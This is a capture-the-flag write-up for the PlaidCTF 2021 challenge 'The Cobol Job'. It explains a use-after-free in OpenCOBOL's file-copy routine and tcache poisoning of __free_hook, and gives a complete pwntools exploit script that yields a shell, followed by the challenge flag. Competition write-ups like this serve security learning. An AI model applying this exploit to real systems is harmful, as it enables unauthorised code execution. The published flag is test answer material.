---
layout: post
title: PlaidCTF 2021: The Cobol Job
---
Even though I was going through some post-quarter-end burnout, I managed to join DiceGang for a bit during PlaidCTF 2021. We ended up getting 2nd, 1 place short of pre-qualifying for DEFCONCTF 2021 Finals :(

## The Cobol Job
We are given a cobol file:
```
-----------------------
1 - Create file
2 - Open file
3 - Read file
4 - Write file
5 - Close file
6 - Copy file
7 - Exit
>
```

We can leak all the addresses including the base of libc by copying `/proc/self/maps` to a file we create, and then reading it.

I spent a long time learning too much cobol than anyone ever should.
Basically, the sizes, file descriptors, and heap pointers to a file's contents are stored in arrays. Ultimately nothing in the implementation would lead to a heap memory corruption.

However, a bug exists in the open cobol implementation of [`CBL_COPY_FILE`](https://github.com/ayumin/open-cobol/blob/72578e8fe3f13257ae5fb2b306aed112fbf7c3c4/libcob/fileio.c#L4751-L4768), which is used in the copy file function. My teammate panda found this but his internet cut out so I implemented it.

`fn1` is freed, and then written to shortly after. `fn1` just happens to be a 0x20 sized tcache chunk. Because this is Ubuntu 18.04, there is no pointer mangling so poisoning the tcache is very easy.

Using our libc leak from prior, simply copy a file whose content is the address of `__free_hook` into a dummy file whose size will fit into tcache idx 0, such as 0x18.

Create two more 0x18-sized files to set up the write into `__free_hook`. I wrote `/bin/sh` to one of these files because I planned to free them to get a shell later on.

Allocate one more 0x18-sized file. This file's buffer is pointing to `__free_hook`. Write the address of `system` to it.
- The write function first reads our input onto the heap, then writes the input from the heap into the file. So, `__free_hook` is now pointing to `system`.

From there we close a file whose content is `/bin/sh` to trigger the `__free_hook`, getting us a shell.

```python
from pwn import *

e = ELF("./chall")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

p = process([e.path])
p = remote("cobol.pwni.ng", 3083)
context.terminal = ['tmux', 'splitw', '-h']
context.log_level="debug"


p.sendlineafter(">", "6")
p.sendlineafter(":", "/proc/self/maps")
p.sendlineafter(":", "/tmp/leek")

p.sendlineafter(">", "2")
p.sendlineafter(":", "/tmp/leek")
p.sendlineafter(":", "1")
p.sendlineafter(":", "10000")

p.sendlineafter(">", "3")
p.sendlineafter(":", "1")

d = p.recvuntil("Exit").splitlines()


for i in d:
    if "libc" in i:
        libc.address = int(i[:12], 16)
        break


print("libc", hex(libc.address))
print("fh", hex(libc.sym["__free_hook"]))


p.sendlineafter(">", "1")
p.sendlineafter(":", "bruh")
p.sendlineafter(":", "2")
p.sendlineafter(":", "24")

p.sendlineafter(">", "4")
p.sendlineafter(":", "2")
p.sendafter(":", p64(libc.sym["__free_hook"])+"\xe8")
p.sendline()


p.sendlineafter(">", "6")
p.sendlineafter(":", "bruh")
p.sendlineafter(":", "/tmp/sice")


p.sendlineafter(">", "1")
p.sendlineafter(":", "bruhaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb")
p.sendlineafter(":", "3")
p.sendlineafter(":", "24")

p.sendlineafter(">", "4")
p.sendlineafter(":", "3")
p.sendlineafter(":", "/bin/sh")
p.sendline()


p.sendlineafter(">", "1")
p.sendlineafter(":", "bruhaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb")
p.sendlineafter(":", "5")
p.sendlineafter(":", "24")


p.sendlineafter(">", "1")
p.sendlineafter(":", "bruhaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbb")
p.sendlineafter(":", "4")
p.sendlineafter(":", "24")

p.sendlineafter(">", "4")
p.sendlineafter(":", "4")
p.sendlineafter(":", p64(libc.sym["system"]))
p.sendline()


p.sendlineafter(">", "5")
p.sendlineafter(":", "3")
print("fh", hex(libc.sym["__free_hook"]))

gdb.attach(p)

p.interactive()
```

Flag: `PCTF{l3arning_n3w_languag3_sh0uld_start_with_g00d_bugs_99d4ec917d097f63107e}`
